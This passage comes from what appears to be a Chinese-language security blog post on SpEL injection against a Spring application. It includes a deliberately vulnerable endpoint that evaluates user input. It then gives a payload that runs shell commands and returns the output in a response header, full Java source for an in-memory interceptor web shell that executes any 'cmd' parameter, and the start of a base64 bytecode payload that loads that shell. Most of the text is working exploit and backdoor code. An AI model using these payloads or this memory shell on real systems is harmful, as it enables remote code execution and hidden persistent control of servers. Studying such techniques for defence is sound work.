punctuation">@ResponseBody</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">spelvul</span><span class="token punctuation">(</span><span class="token class-name">String</span> payload<span class="token punctuation">,</span><span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">StandardEvaluationContext</span> context<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">StandardEvaluationContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        context<span class="token punctuation">.</span><span class="token function">setVariable</span><span class="token punctuation">(</span><span class="token string">"response"</span><span class="token punctuation">,</span>response<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//String cmdStr = "T(java.lang.ClassLoader).getSystemClassLoader().loadClass('java.lang.Runtime').getRuntime().exec('calc')";</span>        <span class="token class-name">ExpressionParser</span> parser <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SpelExpressionParser</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">SpelParserConfiguration</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//创建解析器</span>        <span class="token class-name">Expression</span> exp <span class="token operator">=</span> parser<span class="token punctuation">.</span><span class="token function">parseExpression</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//解析表达式</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span> exp<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payload：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">payload<span class="token operator">=</span>#response<span class="token punctuation">.</span><span class="token function">addHeader</span><span class="token punctuation">(</span><span class="token char">'x-cmd'</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>BufferedReader</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>InputStreamReader</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ProcessBuilder</span><span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">,</span> <span class="token string">"/c"</span><span class="token punctuation">,</span> <span class="token string">"whoami"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"gbk"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">readLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>于是在响应体里面就会带出<code>x-cmd</code>这个参数</p><hr><h2 id="内存马"><a href="#内存马" class="headerlink" title="内存马"></a>内存马</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>cglib<span class="token punctuation">.</span>core<span class="token punctuation">.</span></span>ReflectUtils</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">defineClass</span><span class="token punctuation">(</span>'<span class="token class-name">InceptorMemShell</span>'<span class="token punctuation">,</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span>Base64Utils</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decodeFromString</span><span class="token punctuation">(</span>'yv66vgAAA<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>'<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Thread</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getContextClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>接下来就逐步解析一下这个payload：</p><h3 id="defineClass"><a href="#defineClass" class="headerlink" title="defineClass"></a>defineClass</h3><p>首先我们需要确认我们的目的，我们目的就是加载一个类，并且将其实例化。这里选择了springboot自带的工具类<code>ReflectUtils</code>，因为他识别base64字节，然后加载它。很方便。</p><h3 id="ClassLoader"><a href="#ClassLoader" class="headerlink" title="ClassLoader"></a>ClassLoader</h3><p>加载一个类需要指定classloader，我们肯定选定当前线程上下文的classLoader<br><code>T(java.lang.Thread).currentThread().getContextClassLoader()</code></p><p>第一个payload用到了MLet这个类，实际上是URLClassLoader的实现类</p><hr><h3 id="springboot内存马"><a href="#springboot内存马" class="headerlink" title="springboot内存马"></a>springboot内存马</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">HandlerInterceptor</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span></span><span class="token class-name">DOM</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span></span><span class="token class-name">TransletException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>runtime<span class="token punctuation">.</span></span><span class="token class-name">AbstractTranslet</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>dtm<span class="token punctuation">.</span></span><span class="token class-name">DTMAxisIterator</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>serializer<span class="token punctuation">.</span></span><span class="token class-name">SerializationHandler</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>context<span class="token punctuation">.</span></span><span class="token class-name">WebApplicationContext</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>context<span class="token punctuation">.</span>request<span class="token punctuation">.</span></span><span class="token class-name">RequestContextHolder</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">ModelAndView</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>handler<span class="token punctuation">.</span></span><span class="token class-name">AbstractHandlerMapping</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>mvc<span class="token punctuation">.</span>method<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestMappingHandlerMapping</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletRequest</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletResponse</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">List</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">InceptorMemShell</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractTranslet</span> <span class="token keyword">implements</span> <span class="token class-name">HandlerInterceptor</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">static</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"staart"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">WebApplicationContext</span> context <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">WebApplicationContext</span><span class="token punctuation">)</span> <span class="token class-name">RequestContextHolder</span><span class="token punctuation">.</span><span class="token function">currentRequestAttributes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span><span class="token string">"org.springframework.web.servlet.DispatcherServlet.CONTEXT"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">RequestMappingHandlerMapping</span> mappingHandlerMapping <span class="token operator">=</span> context<span class="token punctuation">.</span><span class="token function">getBean</span><span class="token punctuation">(</span><span class="token class-name">RequestMappingHandlerMapping</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Field</span> field <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            field <span class="token operator">=</span> <span class="token class-name">AbstractHandlerMapping</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"adaptedInterceptors"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NoSuchFieldException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">HandlerInterceptor</span><span class="token punctuation">></span></span> adaptInterceptors <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            adaptInterceptors <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">HandlerInterceptor</span><span class="token punctuation">></span></span><span class="token punctuation">)</span> field<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>mappingHandlerMapping<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IllegalAccessException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token class-name">InceptorMemShell</span> evilInterceptor <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InceptorMemShell</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        adaptInterceptors<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>evilInterceptor<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"ok"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">preHandle</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">,</span> <span class="token class-name">Object</span> handler<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> cmd <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>cmd <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                response<span class="token punctuation">.</span><span class="token function">setCharacterEncoding</span><span class="token punctuation">(</span><span class="token string">"gbk"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>PrintWriter</span> printWriter <span class="token operator">=</span> response<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">ProcessBuilder</span> builder<span class="token punctuation">;</span>                <span class="token class-name">String</span> o <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"os.name"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"win"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    builder <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ProcessBuilder</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"cmd.exe"</span><span class="token punctuation">,</span> <span class="token string">"/c"</span><span class="token punctuation">,</span> cmd<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                    builder <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ProcessBuilder</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"/bin/bash"</span><span class="token punctuation">,</span> <span class="token string">"-c"</span><span class="token punctuation">,</span> cmd<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span>Scanner</span> c <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span>Scanner</span><span class="token punctuation">(</span>builder<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"gbk"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">useDelimiter</span><span class="token punctuation">(</span><span class="token string">"wocaosinidema"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                o <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">?</span> c<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> o<span class="token punctuation">;</span>                c<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                printWriter<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span><span class="token punctuation">;</span>                printWriter<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                printWriter<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">postHandle</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">,</span> <span class="token class-name">Object</span> handler<span class="token punctuation">,</span> <span class="token class-name">ModelAndView</span> modelAndView<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">HandlerInterceptor</span><span class="token punctuation">.</span><span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">postHandle</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> response<span class="token punctuation">,</span> handler<span class="token punctuation">,</span> modelAndView<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">afterCompletion</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">,</span> <span class="token class-name">Object</span> handler<span class="token punctuation">,</span> <span class="token class-name">Exception</span> ex<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">HandlerInterceptor</span><span class="token punctuation">.</span><span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">afterCompletion</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> response<span class="token punctuation">,</span> handler<span class="token punctuation">,</span> ex<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">DOM</span> document<span class="token punctuation">,</span> <span class="token class-name">SerializationHandler</span><span class="token punctuation">[</span><span class="token punctuation">]</span> handlers<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">TransletException</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">DOM</span> document<span class="token punctuation">,</span> <span class="token class-name">DTMAxisIterator</span> iterator<span class="token punctuation">,</span> <span class="token class-name">SerializationHandler</span> handler<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">TransletException</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>那么最终的payload：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">payload<span class="token operator">=</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>cglib<span class="token punctuation">.</span>core<span class="token punctuation">.</span></span>ReflectUtils</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">defineClass</span><span class="token punctuation">(</span>'<span class="token class-name">InceptorMemShell</span>'<span class="token punctuation">,</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span>Base64Utils</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decodeFromString</span><span class="token punctuation">(</span>'yv66vgAAADQBAQoAOwCLCABWCwCMAI0IAI4LAI8AkAsAjwCRCACSCACTCgCUAJUKAA4AlggAlwoADgCYBwCZBwCaCACbCACcCgANAJ0IAJ4IAJ8HAKAKAA0AoQoAogCjCgAUAKQIAKUKABQApgoAFACnCgAUAKgKABQAqQoAqgCrCgCqAKwKAKoAqQcArQoAIACuCwA8AK8LADwAsAkAlACxCACyCgCzAKsKALQAtQgAtgsAtwC4BwC5BwC6CwAqALsHALwIAL0KAL4AvwcAwAoAMACuCgDBAMIKAMEAwwcAxAcAxQoANQCuBwDGCgA3AIsLADQAxwgAyAcAyQcAygEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQASTEluY2VwdG9yTWVtU2hlbGw7AQAJcHJlSGFuZGxlAQBkKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTtMamF2YS9sYW5nL09iamVjdDspWgEAB2J1aWxkZXIBABpMamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyOwEAC3ByaW50V3JpdGVyAQAVTGphdmEvaW8vUHJpbnRXcml0ZXI7AQABbwEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAAWMBABNMamF2YS91dGlsL1NjYW5uZXI7AQABZQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEAB3JlcXVlc3QBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAhyZXNwb25zZQEAKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsBAAdoYW5kbGVyAQASTGphdmEvbGFuZy9PYmplY3Q7AQADY21kAQANU3RhY2tNYXBUYWJsZQcAxgcAywcAzAcAzQcAmgcAzgcAmQcAoAcArQEACkV4Y2VwdGlvbnMBABBNZXRob2RQYXJhbWV0ZXJzAQAKcG9zdEhhbmRsZQEAkihMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7TGphdmEvbGFuZy9PYmplY3Q7TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvTW9kZWxBbmRWaWV3OylWAQAMbW9kZWxBbmRWaWV3AQAuTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvTW9kZWxBbmRWaWV3OwEAD2FmdGVyQ29tcGxldGlvbgEAeShMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7TGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9FeGNlcHRpb247KVYBAAJleAEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsHAM8BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAIPGNsaW5pdD4BACBMamF2YS9sYW5nL05vU3VjaEZpZWxkRXhjZXB0aW9uOwEAIkxqYXZhL2xhbmcvSWxsZWdhbEFjY2Vzc0V4Y2VwdGlvbjsBAAdjb250ZXh0AQA3TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvV2ViQXBwbGljYXRpb25Db250ZXh0OwEAFW1hcHBpbmdIYW5kbGVyTWFwcGluZwEAVExvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9tZXRob2QvYW5ub3RhdGlvbi9SZXF1ZXN0TWFwcGluZ0hhbmRsZXJNYXBwaW5nOwEABWZpZWxkAQAZTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEAEWFkYXB0SW50ZXJjZXB0b3JzAQAQTGphdmEvdXRpbC9MaXN0OwEAD2V2aWxJbnRlcmNlcHRvcgEAFkxvY2FsVmFyaWFibGVUeXBlVGFibGUBAEZMamF2YS91dGlsL0xpc3Q8TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvSGFuZGxlckludGVyY2VwdG9yOz47BwC5BwC6BwDQBwDABwDEBwDFAQAKU291cmNlRmlsZQEAFUluY2VwdG9yTWVtU2hlbGwuamF2YQwAPQA<span class="token operator">+</span><span class="token 